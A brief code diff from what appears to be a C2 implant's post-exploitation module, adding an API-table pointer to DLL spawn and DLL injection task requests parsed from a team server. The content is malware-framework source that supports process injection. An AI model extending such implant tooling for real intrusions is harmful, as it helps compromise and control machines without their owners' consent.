@@ -63,6 +63,7 @@ static BOOL PostExParseSpawnRequest(struct BeaconContext* ctx, UINT32 task_id,
 
     /* wire 参数顺序必须和 TeamServer 下发格式保持一致。 */
     req->task_id = task_id;
+    req->api = &ctx->api;
     req->subcmd = POSTEX_SUBCMD_SPAWN_DLL;
     req->owns_process = TRUE;
     req->wait_ms = ParserU32(parser);
@@ -114,6 +115,7 @@ static BOOL PostExParseInjectRequest(struct BeaconContext* ctx, UINT32 task_id,
 
     /* inject 请求不创建宿主进程，只需要目标 PID。 */
     req->task_id = task_id;
+    req->api = &ctx->api;
     req->subcmd = POSTEX_SUBCMD_INJECT_DLL;
     req->wait_ms = ParserU32(parser);
     req->max_runtime_ms = ParserU32(parser);
